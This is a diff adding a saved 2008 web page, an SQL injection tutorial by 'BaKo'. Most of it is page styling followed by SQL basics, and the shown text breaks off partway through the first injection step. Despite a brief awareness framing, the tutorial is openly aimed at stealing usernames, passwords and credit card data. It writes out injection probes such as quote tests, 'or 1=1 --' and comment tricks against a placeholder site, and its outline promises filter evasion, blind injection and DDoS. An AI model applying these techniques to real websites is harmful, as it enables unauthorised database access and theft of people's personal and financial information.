@@ -1,0 +1,2864 @@
+From: <ÓÉ Microsoft Internet Explorer 5 ±£´æ>
+Subject: Ultimate MySQL Injection Tutorial by BaKo
+Date: Wed, 14 May 2008 10:30:57 +0800
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="text/html";
+	boundary="----=_NextPart_000_0000_01C8B5AD.98E80010"
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.3198
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0000_01C8B5AD.98E80010
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://docs.google.com/View?docid=drcn3mc_2sdcg3q
+
+=EF=BB=BF<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>Ultimate MySQL Injection Tutorial by BaKo</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8">
+<STYLE type=3Dtext/css>@page  {top: flow(header); }
+TABLE {
+	FONT-SIZE: 1em
+}
+DIV {
+	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px
+}
+ADDRESS {
+	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px
+}
+OL {
+	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px
+}
+UL {
+	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px
+}
+LI {
+	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px
+}
+OPTION {
+	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px
+}
+SELECT {
+	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px
+}
+P {
+	MARGIN: 0px
+}
+BODY {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 10pt; PADDING-BOTTOM: =
+0px; MARGIN: 6px; PADDING-TOP: 0px; FONT-FAMILY: Verdana, sans-serif; =
+BACKGROUND-COLOR: #ffffff
+}
+H6 {
+	FONT-SIZE: 10pt
+}
+H5 {
+	FONT-SIZE: 11pt
+}
+H4 {
+	FONT-SIZE: 12pt
+}
+H3 {
+	FONT-SIZE: 13pt
+}
+H2 {
+	FONT-SIZE: 14pt
+}
+H1 {
+	FONT-SIZE: 16pt
+}
+BLOCKQUOTE {
+	BORDER-RIGHT: #ddd 1px dashed; PADDING-RIGHT: 10px; BORDER-TOP: #ddd =
+1px dashed; PADDING-LEFT: 10px; PADDING-BOTTOM: 10px; BORDER-LEFT: #ddd =
+1px dashed; PADDING-TOP: 10px; BORDER-BOTTOM: #ddd 1px dashed
+}
+A IMG {
+	BORDER-RIGHT: 0px; BORDER-TOP: 0px; BORDER-LEFT: 0px; BORDER-BOTTOM: =
+0px
+}
+DIV.google_header {
+	MARGIN-TOP: 1em; MARGIN-BOTTOM: 1em; POSITION: relative
+}
+DIV.google_footer {
+	MARGIN-TOP: 1em; MARGIN-BOTTOM: 1em; POSITION: relative
+}
+
+@media Print   =20
+{
+BODY {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: =
+0px; PADDING-TOP: 0px
+}
+DIV.google_header {
+	BORDER-RIGHT: medium none; BORDER-TOP: medium none; DISPLAY: block; =
+MIN-HEIGHT: 0px; BORDER-LEFT: medium none; BORDER-BOTTOM: medium none
+}
+DIV.google_footer {
+	BORDER-RIGHT: medium none; BORDER-TOP: medium none; DISPLAY: block; =
+MIN-HEIGHT: 0px; BORDER-LEFT: medium none; BORDER-BOTTOM: medium none
+}
+DIV.google_header {
+	flow: static(header)
+}
+DIV.google_header:unknown {
+	POSITION: absolute; TOP: 0px
+}
+DIV.google_footer:unknown {
+	POSITION: absolute; TOP: 0px
+}
+DIV.google_footer {
+	flow: static(footer)
+}
+DIV#google_footer {
+	flow: static(footer, start)
+}
+SPAN.google_pagenumber {
+	content: counter(page)
+}
+SPAN.google_pagecount {
+	content: counter(pages)
+}
+    }
+BODY {
+	FONT-SIZE: 12pt; LINE-HEIGHT: normal; FONT-FAMILY: Times New Roman; =
+BACKGROUND-COLOR: #ffffff
+}
+</STYLE>
+
+<STYLE>#google-view-footer {
+	CLEAR: both; BORDER-TOP: thin solid; PADDING-BOTTOM: 0.3em; =
+PADDING-TOP: 0.3em
+}
+#canedit {
+	DISPLAY: none
+}
+A.google-small-link:link {
+	FONT-SIZE: 11px! important; COLOR: #112abb; FONT-FAMILY: =
+Arial,Sans-serif
+}
+A.google-small-link:visited {
+	FONT-SIZE: 11px! important; COLOR: #112abb; FONT-FAMILY: =
+Arial,Sans-serif
+}
+BODY {
+	DIRECTION: inherit
+}
+P {
+	DIRECTION: inherit
+}
+DIV {
+	DIRECTION: inherit
+}
+TD {
+	DIRECTION: inherit
+}
+
+@media Print   =20
+{
+#google-view-footer {
+	DISPLAY: none
+}
+
+}
+</STYLE>
+
+<SCRIPT>=0A=
+function viewOnLoad() {=0A=
+if (document.location.href.indexOf('spi=3D1') !=3D -1) {=0A=
+if (navigator.userAgent.toLowerCase().indexOf('msie') !=3D -1) {=0A=
+window.print();=0A=
+} else {=0A=
+window.setTimeout(window.print, 10);=0A=
+}=0A=
+}=0A=
+if (document.location.href.indexOf('hgd=3D1') !=3D -1) {=0A=
+var footer =3D document.getElementById("google-view-footer");=0A=
+if (footer) {=0A=
+footer.style.display =3D 'none';=0A=
+}=0A=
+}=0A=
+}=0A=
+</SCRIPT>
+
+<META content=3D"MSHTML 6.00.2900.3314" name=3DGENERATOR></HEAD>
+<BODY>
+<DIV id=3Ddoc-contents>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in" =
+align=3Dcenter><B><U>MySQL=20
+Injection Ultimate Tutorial- By BaKo</U></B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Sql Injection is one =
+of the most=20
+common web application errors today. It is also one of the most =
+deadliest=20
+because it allows remote users to access confidential information such =
+as=20
+usernames and credit cards. With databases being the central core of our =
+economy=20
+and all of our nations wealth being held in servers that may be able to =
+be=20
+compromised by witty hackers, SQL Injection is a problem that needs to =
+be=20
+addresses not to let hackers exploit these errors for their own =
+good,pleasure,=20
+or challenge but rather to bring awareness to the fact that a simple =
+error=20
+caused by a lazy or inexperienced programmer can cause consequences from =
+a=20
+simple website deface to the leaking of millions of users financial =
+information.=20
+To start this paper out, I provide you with an Outline for MySQL =
+Injection=20
+attacks, which will also serve as a table of contents since each section =
+will=20
+discuss a separate step in the exploitation process.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in" align=3Dcenter>MySQL =
+Injection=20
+Outline (table of contents):</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">In Part 1 (this =
+part):</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Section 1 - Intro to =
+Basic=20
+Database Information</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Section 2 =E2=80=93 =
+Steps to=20
+injections</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; MARGIN-LEFT: =
+0.5in">1)Find out=20
+how to close the previous statement &amp; find the right comment to use =
+to end=20
+the injection</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">2)Check for=20
+magic quotes</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">3)Check to=20
+see if UNION works</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">4)Find the=20
+number of columns</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">5)Craft a=20
+union statement that doesnt cause an error and see which columns are=20
+outputted</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">6)Check the=20
+mysql version to see if information_schema is present</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">7)Get the=20
+desired column and table names</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">8)Get your=20
+data</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">In Part 2: (not done =
+yet)</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Section 1 =E2=80=93 =
+Advanced injections=20
+</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">1)Check for=20
+load_file()</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">2)Check for=20
+into outfile</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">3)Ddos the=20
+mysql server</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">4)login page=20
+injections</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">5)Possible=20
+failures - multi selects</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">6)Get past=20
+magic quotes - where, concat - no load_file</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">7)The no=20
+spaces bug</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">8)Getting=20
+past filters</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">9)Blind=20
+Injection</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">10)Advanced=20
+NOT IN</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Before we start =
+anything about=20
+inserting SQL commands and stealing data from columns and tables, we =
+need to=20
+discuss the basics and all the terms that will be necessary for fully=20
+comprehending this paper. So lets begin this with some basic Database =
+Server=20
+Info. By the end of this section you should fully understand the basics =
+of=20
+databases and how they function on a user interaction level.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Section 1: Basic =
+Database=20
+Information</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Database(DB)=20
+Servers are servers that hold information. Information is stored in a =
+type of=20
+holder called database, which is a certain section of the database that =
+serves=20
+as a structured container that stores data in fully organized =
+subsections which=20
+enable the quick and efficient withdrawal or insertion of data..</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">DB Servers=20
+can have many databases, each with a different use, such as web, which =
+may hold=20
+content displayed or needed for the correct display of webpages open to =
+the=20
+public, or intranet, which may include information needed by employees =
+on the=20
+inside network of the company, etc. There are many types of database =
+servers,=20
+but all are similar which few differences. Some common types are:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">1)Mysql</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">2)MsSQL (Microsoft =
+SQL=20
+Server)</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">3)Oracle</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">4)Microsoft =
+Access</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">5)Postgre SQL</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">etc..</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">In this=20
+tutorial we will discuess one of the two most common, MySql (the other =
+most=20
+common is MsSQL, then after that Microsoft Access).</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">DB's are made=20
+up of tables, each which hold a similar type of data such as user info =
+or=20
+articles.Tables are made up of columns, which group the data into =
+different=20
+types such as usernames, passwords, dates registered, etc.The actual =
+data in a=20
+table is in a row, which are inserted into the database and have info =
+for each=20
+column in the table - e.g. a username, password, etc</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">To help visualize =
+visual of a=20
+database server would look like this:</P>
+<P class=3Dwestern lang=3D"" style=3D"MARGIN-BOTTOM: 0.14in"><IMG =
+height=3D296=20
+src=3D"http://docs.google.com/File?id=3Ddrcn3mc_3gs69g2kx" width=3D642 =
+align=3Dbottom=20
+border=3D0 name=3Ddb></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Now, to=20
+access data from the server you would use SQL - Standard Query Language. =
+This is=20
+similar to programming languages in that it has its own set of =
+functions,=20
+operators, and syntax. This lets you select certain data that you want =
+and=20
+choose the database, table, and columns that you want to access the rows =
+in.=20
+</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">SQL has a set=20
+format for selecting data from the database. It looks like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">SELECT=20
+column1,column2 FROM table</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This is basically =
+saying to go to=20
+table =E2=80=9Ctable=E2=80=9D and gets the data stored in columns =
+=E2=80=9Ccolumn1=E2=80=9D and =E2=80=9Ccolumn2=E2=80=9D for=20
+all the rows (since the number is not specified, it takes them all. Ill =
+show you=20
+how to specify how many next) .</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">But what if=20
+you only wanted two rows? Yes, you could still retrieve all the rows =
+then sort=20
+it out with commands in php, but that=E2=80=99s inneficient. Say you =
+wanted the FIRST 2=20
+usernames &amp; passwords from table users of database webinfo (for =
+injections=20
+you usually dont have to put the database, its already selected in the =
+code)You=20
+would use</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Select=20
+column_name FROM table_name limit start,number</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">column_name is the =
+columns you=20
+want. if you want two columns, you would do column1,column2. </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">table_name is the =
+table. If you=20
+want to use a table from a different datbase server, you would do=20
+database.table</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">limit start,number =
+tells the=20
+server how many rows you want. Say you want the first 2 rows, you would =
+make=20
+start 0 (the first row), and put number 2 for two rows. This would =
+basically say=20
+go to the first row (0) and give me the next two rows.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">If you wanted=20
+the next 2 rows after the first two (but only two, not all 4), you would =
+make=20
+start 2 since you already got 2 and make number 2 again. (limit 2,2). =
+This would=20
+be saying go to the second row and get me the next two rows. If you =
+wanted all=20
+four, youwould make start 0 and number 4.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">For=20
+injections you dont need to know how to get the data out of the query =
+result in=20
+php/asp, which usually involve manipulating the arrays returned by the =
+mysql=20
+query, since its already done for you in the code of the script youre =
+trying to=20
+hack. You just need to find which columns get displayed to the page, =
+which we=20
+will discuss later.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Now, say you=20
+want to get the password of a user whose username is "bako123". This is =
+used for=20
+login systems to check logins. Then you would use:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select column_name =
+FROM=20
+table_name WHERE column_name =3D 'Value'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">For example,=20
+if you wanted to the password column from the table users in a row where =
+the=20
+username column is bako123 you would do:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select password FROM =
+users WHERE=20
+username =3D 'bako123'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This would let you =
+retrieve the=20
+password of a certain user, bako123. This can be used in many ways, to =
+retrieve=20
+a certain article, user information, a certain persons financial =
+information,=20
+etc.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">If you wanted=20
+to get the password of a user where the name was similar to bako, maybe =
+xbako or=20
+bakos or xbakos, you would do</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select password FROM =
+users WHERE=20
+username LIKE '%bako%'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">The % is a=20
+wildchar which basically says there can be text in its place, so in this =
+case=20
+there can be text before and after bako since there is a % before and =
+after=20
+it.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">This leads us=20
+to the final discussion in this section: Magic Quotes.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Many database=20
+servers (or scripts that access them) have magic quotes enabled. This =
+takes=20
+quotes like ', which are needed to specify data like for statements like =
+WHERE=20
+username =3D or in functions we will discuss later that load files with =
+a certain=20
+filename. Quotes are needed to specify strings. For example, when we did =
+WHERE=20
+username LIKE =E2=80=98%bako%=E2=80=99, the quotes told the server that =
+the string to search for=20
+was %bako%. If there were no quotes, the server wouldn=E2=80=99t take =
+%bako% as a=20
+string, and not only would the search fail but the script would return =
+an error=20
+because %bako% is out of place.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Magic Quotes=20
+prevents quotes from being used in injections by either making the ' =
+(original=20
+quote) to \' (backslashed quote) or '' (double quote).</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">The \' tells=20
+the sql server to take away the meaning of the ' and regard it as a =
+normal=20
+character in a string. For example, say you wanted to select a password =
+from a=20
+user that had a username Bako's. If you did :</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select password FROM =
+users WHERE=20
+username =3D 'bako's'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">the ' in bako's would =
+end the=20
+username =3D value statement and make it WHERE username =3D 'bako'. Then =
+the s'=20
+would be stray and cause an error.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">So to sepcify=20
+that the ' isnt part of the SQL query syntax but just a normal character =
+in a=20
+string like the letter b, you can use \ to take its meaning away and =
+make it be=20
+considered a normal character by the server.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Another way=20
+the server takes the meaning away from ' is by making it ''. Say you =
+wanted to=20
+find a user by the name of bako's again, and you put bako's straight =
+into the=20
+script, like</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select password FROM =
+users WHERE=20
+username =3D 'bako's'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">the script/server =
+would change it=20
+to </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select password FROM =
+users WHERE=20
+username =3D 'bako''s'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">which would then =
+create two=20
+different strings, bako and s, and since the s is out of place and not =
+in a=20
+statment( like SELECT col FROM table WHERE col =3D value) or function it =
+would=20
+cause an error too. There is a way to get around this in certain cases, =
+and it=20
+will be discussed later. Now that you know basic info on mysql, time to =
+start=20
+Injecting!!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Section 2: SQL =
+Injecting to=20
+Steal Data</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">In this section we =
+will cover=20
+each of the steps to succesfully exploiting SQL Injection =
+vulnerabilities in web=20
+scripts that use mysql. We will go step by step and cover each part =
+thoroughly.=20
+By the time you finished this section you should fully understand how to =
+take=20
+advantage of SQL Injection vulnerabilities and be able to succesfully =
+retrieve=20
+data such as usernames, passwords, financial information, and other =
+assorted=20
+confidential data from databases that are used by vulnerable scripts. =
+Well start=20
+from the very beginning of determining if the script is vulnerable or =
+not.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Subsection 2.1: =
+Check for=20
+Injections</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">So say you=20
+find a script like this and you want to see if its vulnerable to SQL=20
+Injection:</P>
+<P class=3Dwestern=20
+style=3D"MARGIN-BOTTOM: 0.14in">http://site.com/script.php?id=3D1</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">In order to further =
+demonstrate=20
+how this works, lets say you do know what query the script forms (which =
+is=20
+usually very unlikely in real-world injections). Lets say it looks like=20
+this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select title,data =
+FROM news WHERE=20
+id =3D </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">What that would do is =
+get the=20
+title and data info from the news table in a row where the column id was =
+1.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">So, what if=20
+we added some sql commands to the id in the url? Like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><FONT =
+color=3D#0000ff><U><A=20
+href=3D"http://site.com/script.php?id=3D1">http://site.com/script.php?id=3D=
+1</A></U></FONT>'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">The output depends on =
+the=20
+script=E2=80=99s quality. If the script filters the input for sql =
+keywords, or converts=20
+the id value to an integer so the keywords don=E2=80=99t get through, or =
+takes any other=20
+precaution to ensure that you cant insert sql statements into the query, =
+then no=20
+sql error would be returned, and the page will either load normally or =
+give you=20
+a warning like =E2=80=9CAttack Spotted, Your IP Address has been =
+recorded =E2=80=9C or something=20
+similar. However, if the script had no filtering whatsoever and just got =
+the=20
+user data for id straight from the URL and inserted it right into the =
+MySQL=20
+Query, then you would get an error like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">"MySQL Syntax Error =
+By '1'' In=20
+file script.php On Line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then you would know =
+that the=20
+server does NOT filter input to make sure there are no sql =
+commands/syntax in it=20
+and DOES NOT make sure the data is only an integer. Since you got an =
+error, you=20
+are SURE that this is SQL Injectable! </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Keep in mind=20
+that now all sites has errors as verbose as this, some sites have simple =
+errors=20
+like =E2=80=9CINTERNAL ERROR=E2=80=9D or =E2=80=9CERROR=E2=80=9D that =
+reveal no useful data. However, you can be=20
+reasonably sure that its injectable. To be fully sure, move on to the =
+next step.=20
+If all the possibilities fail in the next step, then you now chances are =
+that=E2=80=99s=20
+not an sql error but some other type of error.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Now That you=20
+have found out its injectable, lets go step by step through my MySQL =
+Injection=20
+outline.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Subsection 2.2 - =
+Step 1)Find=20
+out how to close the previous statement.</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">To do this we=20
+will use an SQL operator "and". This word lets you specify two criterias =
+that=20
+the row must match when searching the table. For example, if you have a =
+WHERE=20
+clause, such as </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select user from =
+users where=20
+password =3D 'pass123'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">and want to select =
+data not only=20
+where the password is 'pass123' but also where the email is =
+'email@m.com', you=20
+would use somethings like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select user from =
+users where=20
+password =3D 'pass123' AND email =3D 'email@m.com'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This basically tells =
+the server,=20
+as we had before, select the data from the user column in a row in table =
+users=20
+where the password is pass123 AND the email also is <FONT =
+color=3D#0000ff><U><A=20
+href=3D"mailto:email@m.com">email@m.com</A></U></FONT>. If both of these =
+criteria=20
+are not matched, then the script moves on to the next row.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Another operator like =
+AND is OR.=20
+An example:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select user from =
+users where=20
+password =3D =E2=80=98pass123=E2=80=99 OR email =3D =
+=E2=80=98email@m.com=E2=80=99 </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This basically says, =
+instead of=20
+making sure the column password is pass123 AND the email is <FONT=20
+color=3D#0000ff><U><A =
+href=3D"mailto:email@m.com">email@m.com</A></U></FONT>, it=20
+searches for rows where the password is pass123 or the email is <FONT=20
+color=3D#0000ff><U><A =
+href=3D"mailto:email@m.com">email@m.com</A></U></FONT>. Both=20
+don=E2=80=99t have to be present for the row to be chosen. One will do, =
+even if the=20
+other doesn=E2=80=99t equal the right value.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Now say you=20
+added an and 1=3D1 to any statment, it would load since 1 always equals =
+1. This=20
+can be very useful from an attackers point of view. It can help us find =
+out how=20
+to close the previous query AND can help us to determine is magic quotes =
+are=20
+enabled.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Lets say you=20
+dont know the query, as you wont in most cases. The query could be =
+anything=20
+like:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select user from =
+users where id =3D=20
+'1'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">or</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select user from =
+users where id =3D=20
+(1)</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">or</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select user from =
+users where id =3D=20
+1</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">etc...</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">In order to=20
+add more SQL commands to steal our data (credit cards, usernames, =
+passwords,=20
+etc)we need to be able to end the where id =3D 1 (or '1', (1), etc). To =
+do that we=20
+would have to try different possibilities until we get NO error. </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">In order to=20
+add our command, we would also need to know how to get rid of the other =
+data=20
+that will come after our injection. For example, if the query was like =
+this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select user from =
+users where id =3D=20
+'1'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">and we did=20
+http://site.com/script.php?id=3D1' and 1=3D1 (lets say magic quotes are =
+OFF)</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">the query would =
+become</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select user from =
+users where id =3D=20
+'1' or 1=3D1 '</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">The stray ' after =
+1=3D1, which is=20
+left over from the '1' before we added our commands, needs to be taken =
+care of=20
+or it will cause an error. To do this, we need to use comments to =
+comment out=20
+the rest of the code. Two comment operators are /* and --. Sometimes one =
+will=20
+cause an error, in that case try the other.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">So lets have=20
+an full example for this first step in injections. </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Say the script was, =
+as i said=20
+before:</P>
+<P class=3Dwestern=20
+style=3D"MARGIN-BOTTOM: 0.14in">http://site.com/script.php?id=3D1</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">First we would check =
+if its=20
+injectable:</P>
+<P class=3Dwestern=20
+style=3D"MARGIN-BOTTOM: 0.14in">http://site.com/script.php?id=3D1'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">It gives - "Error in =
+MySQL Syntax=20
+by '1'' in script.php on line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now you know its =
+injectable. Now=20
+lets try to see how to end the WHERE clause.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1=20
+or 1=3D1 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This would work if =
+there was no '=20
+surrounded 1, like in</P>
